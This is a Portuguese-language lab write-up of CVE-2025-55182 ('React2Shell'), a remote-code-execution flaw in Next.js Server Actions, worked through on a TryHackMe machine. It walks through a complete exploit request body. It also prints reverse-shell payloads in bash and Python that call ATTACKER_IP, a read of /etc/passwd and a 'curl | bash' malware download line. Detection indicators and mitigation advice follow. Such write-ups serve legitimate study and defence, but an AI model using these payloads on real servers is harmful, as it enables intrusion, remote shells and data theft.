<!--
title: CVE-2025-55182 — React2Shell
desc: Exploração prática e remedição da falha React2Shell, que permite injeção de comandos a partir de formulários React.
tags: cve, vulnerability, react, rce
readTime: 7 min
-->

<!-- ===================================== -->
<!--  React2Shell — CVE-2025-55182          -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/CVE-2025--55182-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Next.js-Vulnerable-black?style=flat-square&logo=next.js&logoColor=white">
  <img src="https://img.shields.io/badge/React-Security-blue?style=flat-square&logo=react">
  <img src="https://img.shields.io/badge/JavaScript-Node.js-yellow?style=flat-square&logo=javascript&logoColor=black">
  <img src="https://img.shields.io/badge/RCE-Remote%20Code%20Execution-red?style=flat-square">
</p>

---

# ⚛️ React2Shell — CVE-2025-55182

> Análise técnica da vulnerabilidade crítica **React2Shell**, que afeta aplicações **Next.js / React** utilizando **Server Actions**, permitindo **Remote Code Execution (RCE)** através de desserialização insegura e prototype pollution.

---
### 📌 Metadados

- **Data:** 2026-01-03  
- **Status:** `#developed`  
- **Stack:** Next.js · React · Node.js  
- **Categoria:** Web Exploitation / RCE  

---
### 🏷️ Tags

`#CVE2025_55182` `#React2Shell` `#NextJS` `#JavaScript`  
`#WebSecurity` `#Pentest` `#RCE` `#PrototypePollution`  
`#InsecureDeserialization` `#TryHackMe`

---
# Introdução

A vulnerabilidade **React2Shell**, identificada como **CVE-2025-55182**, é uma falha crítica que afeta aplicações **Next.js / React** que utilizam **Server Actions** e determinados fluxos de **serialização/desserialização** de dados no backend. Essa vulnerabilidade permite que um atacante escape do contexto esperado da aplicação e **alcance execução remota de comandos (RCE)** no servidor Node.js

O nome *React2Shell* descreve exatamente o impacto do problema: a partir de uma aplicação React/Next.js, o atacante consegue chegar a um **shell no servidor**.

No laboratório do TryHackMe, essa falha é explorada para demonstrar como uma aplicação aparentemente segura pode ser comprometida apenas com uma requisição HTTP especialmente construída.

---
# Contexto Técnico

## 1. Next.js Server Actions

![React2Shell Graphic](assets/Pasted%20image%2020260103225335.png)

O Next.js introduziu o conceito de **Server Actions**, permitindo que funções do servidor sejam chamadas diretamente a partir do frontend React. Essas ações dependem de:

- Serialização de dados enviados pelo cliente
- Reconstrução desses dados no servidor
- Execução controlada do código associado

O problema surge quando **objetos controlados pelo usuário** são desserializados de forma insegura, permitindo:

- **Prototype Pollution**
- Manipulação de cadeia de promises (`then`)
- Acesso indireto a construtores JavaScript
- Execução arbitrária de código

---
# Visão Geral da Vulnerabilidade (CVE-2025-55182)

## 1. Tipo de Vulnerabilidade

- Insecure Deserialization
- Prototype Pollution
- Remote Code Execution (RCE)

## 2. Impacto

- Execução de comandos no sistema operacional
- Comprometimento total do servidor
- Exfiltração de dados sensíveis
- Persistência e movimentação lateral

## 3. Pré-requisitos

- Aplicação Next.js vulnerável
- Server Actions habilitadas
- Falta de validação/filtragem de objetos recebidos

---
# Como a Vulnerabilidade Funciona?

A falha explora **três conceitos principais do JavaScript/Node.js**:

## 1. Prototype Pollution

Através do uso de `__proto__`, o atacante consegue **modificar o comportamento de objetos globais**.

Exemplo conceitual:

```js
obj = { "__proto__": { admin: true} }
```

Isso altera o protótipo de todos os objetos derivados.

## 2. Cadeia de Promises (`then`)

O JavaScript trata objetos que possuem a propriedade `then` como ***thenables***. Isso permite que objetos falsos sejam interpretados como promises legítimas.

No ataque:

- O campo `then` é subrescrito
- O fluxo interno do Next.js é enganado

## Acesso ao Construtor (`contructor:constructor`)

Este é um truque clássico para alcançar o **Function constructor**:

```js
obj.constructor.constructor("return process")()
```

Isso permite executar código arbitrário dentro do runtime Node.js.

---
# Análise de Proof of Concept (PoC)

## 1. Requisição HTTP

```http
POST / HTTP/1.1

Host: localhost:3000
User-Agent: Mozilla/5.0 ... Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
```

#### Pontos importantes:

- `Next-Action`: indica uma Server Action
- Headers `X-Nextjs-*`: usados internamente pelo framework
- `multipart/form-data`: necessário para enganar o parser

## 2. Corpo de Requisição - Campo `0`

```json
{
	"then": "$1:__proto__:then",
	"status": "resolved_model",
	"reason": -1,
	"value": "{\"then\":\"$B1337\"}",
	"_response": {
		"_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
		"_chunks": "$Q2",
		"_formData": {
			"get": "$1:constructor:constructor"
		}
	}
}
```

Explicação detalhada:

### `then: "$1:__proto__:then"`

- Polui o protótipo
- Manipula o fluxo de promises

### `_formData.get: "$1:constructor:constructor"`

- Acessa o `Function constructor` 
- Permite execução de código arbitrário

### `_prefix`

```js
process.mainModule
	.require('child_process')
	.execSync('id')
```

Esse código:

- Importa o módulo `child_process`
- Executa o comando `id`
- Captura a saída

### `throw Object.assign(...)`

- Força o Next.js a retornar o resultado    
- Usa o erro `NEXT_REDIRECT` como canal de exfiltração

## 3. Resultado Esperado

A resposta HTTP conterá algo como:

```bash
uid=1000(node) gid=1000(node) groups=1000(node)
```

Confirmando **execução remota de comandos**.

---
# Exploração no Laboratório TryHackMe

## Passo a Passo

### 1. Iniciar o laboratório

print do site TryHackMe

### 2. Identificar a aplicação Next.js

Você pode confirmar que consegue visualizar a página inicial do aplicativo visitando:

```http
http://10.66.169.69:3000
```

>**Nota:** O IP varia de acordo com a máquina virtual iniciada pelo TryHackMe porém a porta é sempre a mesma `:3000`.

print da aplicação

### 3. Confirmar Server Actions ativas

É possível verificar se a aplicação web possui vulnerabilidade atráves do [Next.js RSC RCE Scanner](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478) criado por Malayke.

Verifique a documentação do repositório para entender como funciona o scanner.

#### Resultado obtido ao scanner o laboratório

Ao executar o seguinte comando:

```bash
./nextjs-rce-scanner -urls "http://10.66.169.69:3000" -headless=false
```

Obtemos o resultado:

```bash
[*] Starting scan of 1 targets, concurrency: 5
--------------------------------------------------------------------------------
URL                                           Status       Next.js Version    Vulnerability  
-----------------------------------------------------------------------------------------------
http://10.66.169.69:3000                      200          16.0.6             Vulnerable ⚠️  
```

Isso indica que a aplicação é vulnerável.

### 4. Enviar o payload

Através do BurpSuite, é possível enviar o payload da seguinte forma:

#### Passo 1: Repeater

Primeiro entre na aba **Repeater** e clique no `+` para criar uma nova aba HTTP

![Repeater](assets/Pasted%20image%2020260112210304.png)

#### Passo 2: Colar payload

Após entrar na nova aba, é possível colar o payload:

![Payload](assets/Pasted%20image%2020260112210617.png)

No payload é possível perceber pelo `execSync('id'...)` que o comando `'id'` será executado no servidor remoto, retornando assim a saída do comando como resposta.

![Comando](assets/Pasted%20image%2020260112210825.png)

#### Passo 3: Preparando o envio

Antes de clicar em `Send`, é necessário especificar na ferramenta do BurpSuite o servidor alvo. Clicando em `Target: Not specified`:

![Alvo](assets/Pasted%20image%2020260112210958.png)

Colocamos as seguintes configurações:

- Host: `10.66.169.69`
- Port: `3000`
- E como o nosso servidor não está usando HTTPS, desmarcamos a opção `Use HTTPS`.

![Configuração de Host](assets/Pasted%20image%2020260112211317.png)

> Relembrando que o IP de Host pode variar de acordo com o seu laboratório do TryHackMe.

Agora é possível enviar o payload para o servidor e verificar a resposta.

#### Passo 4: Resposta

Aqui ao executar o comando `whoami` é possível ver a resposta do comando executado no servidor através da vulnerabilidade:

![Resposta](assets/Pasted%20image%2020260112211705.png)

---
# Outros Exemplos de Payloads

## 1. Executar `whoami`

```bash
execSync('whoami')
```

## 2. Ler arquivos sensíveis

```bash
execSync('cat /etc/passwd')
```

## 3. Reverse Shell

```bash
execSync("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

Payload completo para reverse shell:

```js
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"', {'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

Com Python3:

```js
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('python3 -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"ATTACKER_IP\\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"])\\\"', {'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

## 4. Download de malware

```bash
execSync('curl http://ATTACKER/shell.sh | bash')
```

---
# Detecção de Vulnerabilidade

## 1. Indicadores de Comprometimento (IoCs)

- Headers `Next-Action` inesperados
- Requisições `multipart/form-data` anômalas
- Erros `NEXT_REDIRECT` frequentes
- Execução inesperada de processos (`child_process`)    

## 2. Ferramentas

- WAF com inspeção de payloads
- Logs do Node.js
- EDR no servidor
- SAST/DAST focado em Next.js

---
# Mitigação e Correção

## 1. Atualização

- Atualizar Next.js para versões corrigidas
- Aplicar patches de segurança oficiais

## 2. Boas Práticas

- Nunca confiar em objetos recebidos do cliente
- Bloquear propriedades como:
    - `__proto__`
    - `constructor`
    - `prototype`

## 3 Hardening

- Desabilitar Server Actions desnecessárias
- Rodar Node.js com permissões mínimas
- Containers com isolamento (Docker)

## 4. WAF Rules

Bloquear padrões como:

- `constructor:constructor`
- `__proto__`
- `child_process`

---
# Conclusão

A **CVE-2025-55182 (React2Shell)** demonstra como falhas em **serialização e design de frameworks modernos** podem resultar em impactos críticos. O laboratório do TryHackMe é um excelente exemplo prático de como:

- Uma única requisição HTTP    
- Pode levar a RCE completo

Compreender essa vulnerabilidade é essencial para **pentesters**, **blue team** e **desenvolvedores**, especialmente em ambientes que utilizam **Next.js em produção**.

---
# Referências

- [Laboratório React2Shell – TryHackMe](https://tryhackme.com/room/react2shellcve202555182)
